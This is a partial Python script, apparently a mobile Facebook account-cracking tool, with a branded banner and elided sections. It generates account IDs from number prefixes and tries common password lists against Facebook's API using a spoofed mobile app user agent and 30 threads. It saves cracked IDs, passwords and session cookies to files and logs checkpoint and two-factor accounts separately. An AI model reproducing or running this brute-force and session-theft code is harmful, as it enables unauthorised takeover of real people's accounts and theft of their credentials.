...
\033[1;39m======================================================
{GREEN}[𓆦]{WHITE} 𝐎𝐖𝐍𝐄𝐑        :  {GREEN}𝐀𝐍𝐐𝐄𝐋𝐀𝐍𝐄 𝐘𝐀𝐑𝐀𝐍
{GREEN}[𓆦]{WHITE} 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊     :  {GREEN}𝐌𝐑 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑 
{GREEN}[𓆦]{WHITE} 𝐕𝐄𝐑𝐒𝐈𝐎𝐍      :  {GREEN}1.5
{GREEN}[𓆦]{WHITE} 𝐓𝐎𝐎𝐋 𝐒𝐓𝐀𝐓𝐔𝐒. :  {GREEN}𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋 𝐊𝐈𝐍𝐆
\033[1;39m======================================================
\33[1;97m\33[42m[\33[1;91m𝐀𝐍𝐐𝐄𝐋𝐀𝐍𝐄 𝐘𝐀𝐑𝐀𝐍\x1b[38;5;208m: \33[1;97m𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑🙄👉𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋 𝐊𝐈𝐍𝐆\33[1;95m-1.0\33[1;97m]\x1b[0m
\033[1;39m======================================================
""")
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                clear()
                                print('\033[1;39m EXAMPLE : first last,firtslast,first123')
                                linex()
...
def pak():
                user=[]
                clear()
                print('\033[1;39m CODE EXAMPLE : 9377,9378,9370,93700,93705')
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'۱۲۳۴۵۶','۱۲۳۴۵۶۷','۱۲۳۴۵۶۷۸','۱۲۳۴۵۶۷۸۹','Afghanistan1','Afghanistan123','Afghanistan12','Afghanistan1234','100200','10002000','500600','5000600']
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                     ...
                     #   headers={'User-Agent': '[FBAN/FB4A;FBAV/39.0.0.4815;FBBV/7724320;[FBAN/FB4A;FBAV/16.0.0.20.15;FBBV/4061184;FBDM/{density=1.5,width=540,height=960};FBLC/bm_ML;FB_FW/2;FBCR/MY CELCOM;FBPN/com.facebook.katana;FBDV/Lenovo A850+;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}   
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [-𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ALONE-𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [-𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
